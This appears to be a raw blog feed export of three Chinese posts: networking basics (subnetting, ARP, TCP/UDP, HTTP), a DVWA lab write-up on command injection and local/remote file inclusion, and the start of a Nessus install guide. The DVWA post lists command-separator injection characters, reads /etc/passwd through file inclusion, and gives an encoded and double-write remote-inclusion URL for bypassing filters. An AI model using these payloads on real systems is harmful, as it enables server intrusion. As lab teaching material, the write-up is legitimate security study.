255.255.255.0。其它类推，不再详述。下面我们关键要介绍的是一个IP地址，还需要将其高位主机位再作为划分出的子网网络号，剩下的是每个子网的主机号，这时该如何进行每个子网的掩码计算。</p><p>　　下面总结一下有关子网掩码和网络划分常见的面试考题：</p><h5 id="1）利用子网数来计算"><a href="#1）利用子网数来计算" class="headerlink" title="1）利用子网数来计算"></a>1）利用子网数来计算</h5><p>　　在求子网掩码之前必须先搞清楚要划分的子网数目，以及每个子网内的所需主机数目。</p><p>　　(1) 将子网数目转化为二进制来表示;</p><p>　　如欲将B类IP地址168.195.0.0划分成27个子网：27=11011；</p><p>　　(2) 取得该二进制的位数，为N；</p><p>　　该二进制为五位数，N = 5</p><p>　　(3) 取得该IP地址的类子网掩码，将其主机地址部分的的前N位置1即得出该IP地址划分子网的子网掩码。</p><p>　　将B类地址的子网掩码255.255.0.0的主机地址前5位置 1，得到 255.255.248.0</p><h5 id="2）利用主机数来计算"><a href="#2）利用主机数来计算" class="headerlink" title="2）利用主机数来计算"></a>2）利用主机数来计算</h5><p>　　如欲将B类IP地址168.195.0.0划分成若干子网，每个子网内有主机700台：</p><p>　　(1) 将主机数目转化为二进制来表示；</p><p>　　700=1010111100；</p><p>　　(2) 如果主机数小于或等于254（注意去掉保留的两个IP地址），则取得该主机的二进制位数，为N，这里肯定 N&lt;8。如果大于254，则 N&gt;8，这就是说主机地址将占据不止8位；</p><p>　　该二进制为十位数，N=10；</p><p>　　(3) 使用255.255.255.255来将该类IP地址的主机地址位数全部置1，然后从后向前的将N位全部置为 0，即为子网掩码值。</p><p>　　将该B类地址的子网掩码255.255.0.0的主机地址全部置1，得到255.255.255.255，然后再从后向前将后 10位置0,即为：11111111.11111111.11111100.00000000，即255.255.252.0。这就是该欲划分成主机为700台的B类IP地址 168.195.0.0的子网掩码。</p><h6 id="3）还有一种题型，要你根据每个网络的主机数量进行子网地址的规划和计算子网掩码。这也可按上述原则进行计算。"><a href="#3）还有一种题型，要你根据每个网络的主机数量进行子网地址的规划和计算子网掩码。这也可按上述原则进行计算。" class="headerlink" title="3）还有一种题型，要你根据每个网络的主机数量进行子网地址的规划和计算子网掩码。这也可按上述原则进行计算。"></a>3）还有一种题型，要你根据每个网络的主机数量进行子网地址的规划和计算子网掩码。这也可按上述原则进行计算。</h6><p>　　比如一个子网有10台主机，那么对于这个子网需要的IP地址是：</p><p>　　10＋1＋1＋1＝13</p><p>　　注意：加的第一个1是指这个网络连接时所需的网关地址，接着的两个1分别是指网络地址和广播地址。</p><p>　　因为13小于16（16等于2的4次方），所以主机位为4位。而256－16＝240，所以该子网掩码为255.255.255.240。</p><p>　　如果一个子网有14台主机，不少人常犯的错误是：依然分配具有16个地址空间的子网，而忘记了给网关分配地址。这样就错误了，因为14＋1＋1＋1＝17，17大于16，所以我们只能分配具有32个地址（32等于2的5次方）空间的子网。这时子网掩码为：255.255.255.224。</p><h1 id="5-ARP-RARP协议"><a href="#5-ARP-RARP协议" class="headerlink" title="5. ARP/RARP协议"></a>5. ARP/RARP协议</h1><p>　　地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。</p><h4 id="ARP工作流程举例："><a href="#ARP工作流程举例：" class="headerlink" title="ARP工作流程举例："></a>ARP工作流程举例：</h4><p>　　主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01；</p><p>　　主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02；</p><p>　　当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">　　（1）根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。</span><br><span class="line"></span><br><span class="line">　　（2）如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。</span><br><span class="line"></span><br><span class="line">　　（3）主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</span><br><span class="line"></span><br><span class="line">　　（4）主机B将包含其MAC地址的ARP回复消息直接发送回主机A。</span><br><span class="line"></span><br><span class="line">　　（5）当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</span><br><span class="line"></span><br><span class="line">　　逆地址解析协议，即RARP，功能和ARP协议相对，其将局域网中某个主机的物理地址转换为IP地址，比如局域网中有一台主机只知道物理地址而不知道IP地址，那么可以通过RARP协议发出征求自身IP地址的广播请求，然后由RARP服务器负责回答。</span><br></pre></td></tr></table></figure></p><h4 id="RARP协议工作流程："><a href="#RARP协议工作流程：" class="headerlink" title="RARP协议工作流程："></a>RARP协议工作流程：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">　　（1）给主机发送一个本地的RARP广播，在此广播包中，声明自己的MAC地址并且请求任何收到此请求的RARP服务器分配一个IP地址；</span><br><span class="line"></span><br><span class="line">　　（2）本地网段上的RARP服务器收到此请求后，检查其RARP列表，查找该MAC地址对应的IP地址；</span><br><span class="line"></span><br><span class="line">　　（3）如果存在，RARP服务器就给源主机发送一个响应数据包并将此IP地址提供给对方主机使用；</span><br><span class="line"></span><br><span class="line">　　（4）如果不存在，RARP服务器对此不做任何的响应；</span><br><span class="line"></span><br><span class="line">　　（5）源主机收到从RARP服务器的响应信息，就利用得到的IP地址进行通讯；如果一直没有收到RARP服务器的响应信息，表示初始化失败。</span><br></pre></td></tr></table></figure><h1 id="6-路由选择协议"><a href="#6-路由选择协议" class="headerlink" title="6. 路由选择协议"></a>6. 路由选择协议</h1><p>　　常见的路由选择协议有：RIP协议、OSPF协议。</p><h4 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议"></a>RIP协议</h4><p>  底层是贝尔曼福特算法，它选择路由的度量标准（metric)是跳数，最大跳数是15跳，如果大于15跳，它就会丢弃数据包。</p><h4 id="OSPF协议"><a href="#OSPF协议" class="headerlink" title="OSPF协议"></a>OSPF协议</h4><p>  Open Shortest Path First开放式最短路径优先，底层是迪杰斯特拉算法，是链路状态路由选择协议，它选择路由的度量标准是带宽，延迟。</p><h1 id="7-TCP-IP协议"><a href="#7-TCP-IP协议" class="headerlink" title="7. TCP/IP协议"></a>7. TCP/IP协议</h1><h4 id="关于TCP-IP协议"><a href="#关于TCP-IP协议" class="headerlink" title="关于TCP/IP协议"></a>关于TCP/IP协议</h4><p>　　TCP/IP协议是Internet最基本的协议、Internet国际互联网络的基础，由网络层的IP协议和传输层的TCP协议组成。通俗而言：TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地。而IP是给因特网的每一台联网设备规定一个地址。</p><p>　　IP层接收由更低层（网络接口层例如以太网设备驱动程序）发来的数据包，并把该数据包发送到更高层—TCP或UDP层；相反，IP层也把从TCP或UDP层接收来的数据包传送到更低层。IP数据包是不可靠的，因为IP并没有做任何事情来确认数据包是否按顺序发送的或者有没有被破坏，IP数据包中含有发送它的主机的地址（源地址）和接收它的主机的地址（目的地址）。</p><p> 　　TCP是面向连接的通信协议，通过<code>三次握手</code>建立连接，通讯完成时要拆除连接，由于TCP是面向连接的所以只能用于端到端的通讯。TCP提供的是一种可靠的数据流服务，采用“带重传的肯定确认”技术来实现传输的可靠性。TCP还采用一种称为“滑动窗口”的方式进行流量控制，所谓窗口实际表示接收能力，用以限制发送方的发送速度。</p><h4 id="TCP报文首部格式："><a href="#TCP报文首部格式：" class="headerlink" title="TCP报文首部格式："></a>TCP报文首部格式：</h4><p><img src="\images\pasted-183.png" alt="upload successful"></p><h4 id="TCP协议的三次握手和四次挥手："><a href="#TCP协议的三次握手和四次挥手：" class="headerlink" title="TCP协议的三次握手和四次挥手："></a>TCP协议的三次握手和四次挥手：</h4><p><img src="\images\pasted-184.png" alt="upload successful"></p><p>注：seq:”sequance”序列号；ack:”acknowledge”确认号；SYN:”synchronize”请求同步标志；；ACK:”acknowledge”确认标志”；FIN：”Finally”结束标志。</p><h4 id="TCP连接建立过程："><a href="#TCP连接建立过程：" class="headerlink" title="TCP连接建立过程："></a>TCP连接建立过程：</h4><p>首先Client端发送连接请求报文，Server段接受连接后回复ACK报文，并为这次连接分配资源。Client端接收到ACK报文后也向Server段发生ACK报文，并分配资源，这样TCP连接就建立了。</p><h4 id="TCP连接断开过程："><a href="#TCP连接断开过程：" class="headerlink" title="TCP连接断开过程："></a>TCP连接断开过程：</h4><p>  假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了</p><h4 id="为什么要三次握手："><a href="#为什么要三次握手：" class="headerlink" title="为什么要三次握手："></a>为什么要三次握手：</h4><p>有时候Client端重新发送请求不是因为数据报丢失了，而是有可能数据传输过程因为网络并发量很大在某结点被阻塞了，这种情形下Server端将先后收到2次请求，并持续等待两个Client请求向他发送数据…问题就在这里，Cient端实际上只有一次请求，而Server端却有2个响应，极端的情况可能由于Client端多次重新发送请求数据而导致Server端最后建立了N多个响应在等待，因而造成极大的资源浪费！所以，“三次握手”很有必要！</p><h4 id="为什么要四次挥手："><a href="#为什么要四次挥手：" class="headerlink" title="为什么要四次挥手："></a>为什么要四次挥手：</h4><p>假如现在你是客户端你想断开跟Server的所有连接该怎么做？第一步，你自己先停止向Server端发送数据，并等待Server的回复。但事情还没有完，虽然你自身不往Server发送数据了，但是因为你们之前已经建立好平等的连接了，所以此时他也有主动权向你发送数据；故Server端还得终止主动向你发送数据，并等待你的确认。其实，就是保证双方的一个确认的完整执行！</p><h4 id="使用TCP的协议："><a href="#使用TCP的协议：" class="headerlink" title="使用TCP的协议："></a>使用TCP的协议：</h4><p>FTP（文件传输协议）、Telnet（远程登录协议）、SMTP（简单邮件传输协议）、POP3（和SMTP相对，用于接收邮件）、HTTP协议等。</p><h1 id="8-UDP协议"><a href="#8-UDP协议" class="headerlink" title="8. UDP协议　"></a>8. UDP协议　</h1><p>　　UDP用户数据报协议，是面向无连接的通讯协议，UDP数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。UDP通讯时不需要接收方确认，属于不可靠的传输，可能会出现丢包现象，实际应用中要求程序员编程验证。</p><p>　　UDP与TCP位于同一层，但它不管数据包的顺序、错误或重发。因此，UDP不被应用于那些使用虚电路的面向连接的服务，UDP主要用于那些面向查询—应答的服务，例如NFS。相对于FTP或Telnet，这些服务需要交换的信息量较小。</p><p>　　每个UDP报文分UDP报头和UDP数据区两部分。报头由四个16位长（2字节）字段组成，分别说明该报文的源端口、目的端口、报文长度以及校验值。UDP报头由4个域组成，其中每个域各占用2个字节，具体如下：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　（1）源端口号；</span><br><span class="line"></span><br><span class="line">　　（2）目标端口号；</span><br><span class="line"></span><br><span class="line">　　（3）数据报长度；</span><br><span class="line"></span><br><span class="line">　　（4）校验值。</span><br></pre></td></tr></table></figure></p><h4 id="使用UDP协议"><a href="#使用UDP协议" class="headerlink" title="使用UDP协议"></a>使用UDP协议</h4><p>  包括：TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。</p><h4 id="TCP-与-UDP-的区别："><a href="#TCP-与-UDP-的区别：" class="headerlink" title="TCP 与 UDP 的区别："></a>TCP 与 UDP 的区别：</h4><p>TCP是面向连接的，可靠的字节流服务；UDP是面向无连接的，不可靠的数据报服务。</p><h1 id="9-DNS协议"><a href="#9-DNS协议" class="headerlink" title="9. DNS协议"></a>9. DNS协议</h1><p>　　DNS是域名系统(DomainNameSystem)的缩写，该系统用于命名组织到域层次结构中的计算机和网络服务，可以简单地理解为将URL转换为IP地址。域名是由圆点分开一串单词或缩写组成的，每一个域名都对应一个惟一的IP地址，在Internet上域名与IP地址之间是一一对应的，DNS就是进行域名解析的服务器。DNS命名用于Internet等TCP/IP网络中，通过用户友好的名称查找计算机和服务。</p><h1 id="10-NAT协议"><a href="#10-NAT协议" class="headerlink" title="10. NAT协议"></a>10. NAT协议</h1><p>　　NAT网络地址转换(Network Address Translation)属接入广域网(WAN)技术，是一种将私有（保留）地址转化为合法IP地址的转换技术，它被广泛应用于各种类型Internet接入方式和各种类型的网络中。原因很简单，NAT不仅完美地解决了lP地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。</p><h1 id="11-DHCP协议"><a href="#11-DHCP协议" class="headerlink" title="11. DHCP协议"></a>11. DHCP协议</h1><p>　　DHCP动态主机设置协议（Dynamic Host Configuration Protocol）是一个局域网的网络协议，使用UDP协议工作，主要有两个用途：给内部网络或网络服务供应商自动分配IP地址，给用户或者内部网络管理员作为对所有计算机作中央管理的手段。</p><h1 id="12-HTTP协议"><a href="#12-HTTP协议" class="headerlink" title="12. HTTP协议"></a>12. HTTP协议</h1><p>　　超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。</p><p>　　HTTP 协议包括哪些请求？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　GET：请求读取由URL所标志的信息。</span><br><span class="line"></span><br><span class="line">　　POST：给服务器添加信息（如注释）。</span><br><span class="line"></span><br><span class="line">　　PUT：在给定的URL下存储一个文档。</span><br><span class="line"></span><br><span class="line">　　DELETE：删除给定的URL所标志的资源。</span><br></pre></td></tr></table></figure></p><h4 id="HTTP-中，-POST-与-GET-的区别"><a href="#HTTP-中，-POST-与-GET-的区别" class="headerlink" title="HTTP 中， POST 与 GET 的区别"></a>HTTP 中， POST 与 GET 的区别</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">　　1）Get是从服务器上获取数据，Post是向服务器传送数据。</span><br><span class="line"></span><br><span class="line">　　2）Get是把参数数据队列加到提交表单的Action属性所指向的URL中，值和表单内各个字段一一对应，在URL中可以看到。</span><br><span class="line"></span><br><span class="line">　　3）Get传送的数据量小，不能大于2KB；Post传送的数据量较大，一般被默认为不受限制。</span><br><span class="line"></span><br><span class="line">　　4）根据HTTP规范，GET用于信息获取，而且应该是安全的和幂等的。</span><br><span class="line"></span><br><span class="line">　　I. 所谓 安全的 意味着该操作用于获取信息而非修改信息。换句话说，GET请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态。</span><br><span class="line"></span><br><span class="line">　　II. 幂等 的意味着对同一URL的多个请求应该返回同样的结果。</span><br></pre></td></tr></table></figure><h1 id="13-一个完整的传输过程"><a href="#13-一个完整的传输过程" class="headerlink" title="13. 一个完整的传输过程"></a>13. 一个完整的传输过程</h1><p>　　在浏览器中输入 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  后执行的全部过程</p><p>　　现在假设如果我们在客户端（客户端）浏览器中输入<a href="http://www.baidu.com,而baidu.com为要访问的服务器（服务器），下面详细分析客户端为了访问服务器而执行的一系列关于协议的操作：" target="_blank" rel="noopener">http://www.baidu.com,而baidu.com为要访问的服务器（服务器），下面详细分析客户端为了访问服务器而执行的一系列关于协议的操作：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　1）客户端浏览器通过DNS解析到www.baidu.com的IP地址220.181.27.48，通过这个IP地址找到客户端到服务器的路径。客户端浏览器发起一个HTTP会话到220.161.27.48，然后通过TCP进行封装数据包，输入到网络层。</span><br><span class="line"></span><br><span class="line">　　2）在客户端的传输层，把HTTP会话请求分成报文段，添加源和目的端口，如服务器使用80端口监听客户端的请求，客户端由系统随机选择一个端口如5000，与服务器进行交换，服务器把相应的请求返回给客户端的5000端口。然后使用IP层的IP地址查找目的端。</span><br><span class="line"></span><br><span class="line">　　3）客户端的网络层不用关系应用层或者传输层的东西，主要做的是通过查找路由表确定如何到达服务器，期间可能经过多个路由器，这些都是由路由器来完成的工作，不作过多的描述，无非就是通过查找路由表决定通过那个路径到达服务器。</span><br><span class="line"></span><br><span class="line">　　4）客户端的链路层，包通过链路层发送到路由器，通过ARP协议查找给定IP地址的MAC地址，然后发送ARP请求查找目的地址，如果得到回应后就可以使用ARP的请求应答交换的IP数据包现在就可以传输了，然后发送IP数据包到达服务器的地址。</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="网络" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>代码注入漏洞</title>
    <link href="http://yoursite.com/2018/08/28/%E7%A9%BFDVWA%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/28/穿DVWA指北/</id>
    <published>2018-08-28T07:24:05.000Z</published>
    <updated>2018-09-04T09:17:41.878Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-178.png" alt="upload successful"></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、<br>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。命令执行是代码注入的一种。</p><p>直接输入127.0.0.1，显示可以执行</p><p><img src="\images\pasted-174.png" alt="upload successful"></p><h4 id="攻击绕过"><a href="#攻击绕过" class="headerlink" title="攻击绕过"></a>攻击绕过</h4><p>在linux上绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">；</span><br><span class="line">|</span><br><span class="line">||</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">空格</span><br><span class="line">&apos; |&apos;</span><br><span class="line">&amp;;&amp;</span><br></pre></td></tr></table></figure></p><p>windows上绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|</span><br><span class="line">||</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure></p><p>一些区别<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;前面的语句为假则直接执行后面的</span><br><span class="line">&amp;&amp;前面的语句为假则直接出错，后面的也不执行</span><br><span class="line">|直接执行后面的语句</span><br><span class="line">||前面出错执行后面的</span><br></pre></td></tr></table></figure></p><h4 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">尽量少用执行命令的函数或者直接禁用</span><br><span class="line">参数值尽量使用引号包括</span><br><span class="line">在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</span><br></pre></td></tr></table></figure><h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>本地包含漏洞是PHP中一种典型的高危漏洞。由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p><p><img src="\images\pasted-175.png" alt="upload successful"></p><p>但是由于page参数没有过滤，我们可以自己提交参数内容，这个时候就导致了包含漏洞的出现,赋值参数为/etc/passwd，成功包含</p><h4 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h4><h5 id="1-自己上传文件并实现包含"><a href="#1-自己上传文件并实现包含" class="headerlink" title="1.自己上传文件并实现包含"></a>1.自己上传文件并实现包含</h5><p>这里主要是结合服务器一些文件上传点，比如头像上传、相册照片上传等，而后结合php的%00截断特性成功利用包含漏洞（php5.4之后已修复截断特性），假设我们可以自定义上传头像，头像文件在网站根目录的photo下，具体目录可以传上去之后查看图片Url信息。上传时，们可以简单的改一下后缀名，在php代码前加一个GIF89a就可绕过大多数检测。</p><h5 id="2-包含环境变量文件"><a href="#2-包含环境变量文件" class="headerlink" title="2.包含环境变量文件"></a>2.包含环境变量文件</h5><p>Linux下有一个文件/proc/self/environ，这个文件里保存了系统的一些变量，用户可通过修改浏览器的agent信息插入自己的内容到该文件，将php代码写进去之后再利用LFI进行包含就可以实现漏洞的利用。</p><p><img src="\images\pasted-176.png" alt="upload successful"></p><h5 id="3-包含web-server日志文件"><a href="#3-包含web-server日志文件" class="headerlink" title="3.包含web server日志文件"></a>3.包含web server日志文件</h5><p>Apache的日志文件在LFI漏洞的利用中是非常常见的。因为不管我们提交的Get请求或者Post请求都会被apache记录到日志文件里。所以我们可以控制请求内容，将恶意代码写入日志文件，从而实现包含。</p><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><h4 id="攻击绕过-1"><a href="#攻击绕过-1" class="headerlink" title="攻击绕过"></a>攻击绕过</h4><p>构造url<br><code>http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</code><br>为了增加隐蔽性，可以对<a href="http://192.168.5.12/phpinfo.txt进行编码" target="_blank" rel="noopener">http://192.168.5.12/phpinfo.txt进行编码</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74</span><br></pre></td></tr></table></figure></p><p>可以使用双写绕过<br>例如page=ht<a href="http://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。" target="_blank" rel="noopener">http://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。</a></p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">禁用eval（）等可以执行命令的危险函数</span><br><span class="line">对用户的输入数据进行处理</span><br><span class="line">避免动态include远程文件</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Nessus安装使用</title>
    <link href="http://yoursite.com/2018/08/28/Nessus%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/28/Nessus安装使用/</id>
    <published>2018-08-28T02:59:05.000Z</published>
    <updated>2018-08-28T03:56:14.909Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-152.png" alt="upload successful"></p><h1 id="Nessus简介"><a href="#Nessus简介" class="headerlink" title="Nessus简介"></a>Nessus简介</h1><h4 id="优势："><a href="#优势：" class="headerlink" title="优势："></a>优势：</h4><p>Nessus Professional是行业中部署最广泛的漏洞评估解决方案，可帮助用户减少组织的攻击面并确保合规性。Nessus具有高速资产发现，配置审计，目标分析，恶意软件检测，敏感数据发现等功能。</p><p>Nessus支持比竞争对手解决方案更多的技术，扫描操作系统，网络设备，虚拟机管理程序，数据库，Web服务器以及关键基础设施，以解决漏洞，威胁和违规问题。</p><p>随着世界上最大的不断更新的漏洞和配置检查库，以及Tenable公司的专家漏洞研究小组的支持，Nessus设定了漏洞扫描速度和准确性的标准。</p><h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><p>提供完整的电脑漏洞扫描服务, 并随时更新其漏洞数据库。</p><p>可同时在本机或远端上摇控, 进行系统的漏洞分析扫描。</p><p>其运作效能能随着系统的资源而自行调整。</p><p>可自行定义插件(Plug-in)，完整支持SSL (Secure Socket Layer)。</p><h1 id="Nessus的安装"><a href="#Nessus的安装" class="headerlink" title="Nessus的安装"></a>Nessus的安装</h1><h4 id="常规安装"><a href="#常规安装" class="headerlink" title="常规安装"></a>常规安装</h4><p>1.从<a href="https://www.tenable.com/products/nessus/select-your-operating-system上下载对应操作系统版本的nessus" target="_blank" rel="noopener">https://www.tenable.com/products/nessus/select-your-operating-system上下载对应操作系统版本的nessus</a></p><p>2.下载下来之后按照一般软件的安装过程进行安装，安装可以更改安装目录</p><p>3.安装完成之后，会自动在默认浏览器中进入欢迎界面</p><p>4.一路继续，之后有一步需要输入激活码的步骤，输入在nessus官网注册（<a href="https://www.tenable.com/products/nessus-home）时发送到自己邮箱中的注册码，之后点击继续" target="_blank" rel="noopener">https://www.tenable.com/products/nessus-home）时发送到自己邮箱中的注册码，之后点击继续</a></p><p>5.成功之后，输入配置时的用户名和密码就可以登录到nessus中</p><p><img src="\images\pasted-153.png" alt="upload successful"></p><h4 id="离线安装"><a href="#离线安装" class="headerlink" title="离线安装"></a>离线安装</h4><p>在安装注册过程的4步，常常出现“Plugin Download Fail”问题，这个时候可以采用离线加载继续安装。下载离线安装包all-2.0.tar.gz并将它拷贝到nessus的安装目录下，在命令提示符下切换到nessus的安装目录下输入如下命令</p><p><code>nessuscli update all-2.0.tar.gz</code></p><h1 id="Nessus的使用"><a href="#Nessus的使用" class="headerlink" title="Nessus的使用"></a>Nessus的使用</h1><h4 id="Nessus导航"><a href="#Nessus导航" class="headerlink" title="Nessus导航"></a>Nessus导航</h4><p>顶部的导航条显示两个主页面的链接：扫描和设置。您可以使用这两个页面执行所有Nessus主要任务。点击页面名称打开相应的页面。</p><p><img src="\images\pasted-154.png" alt="upload 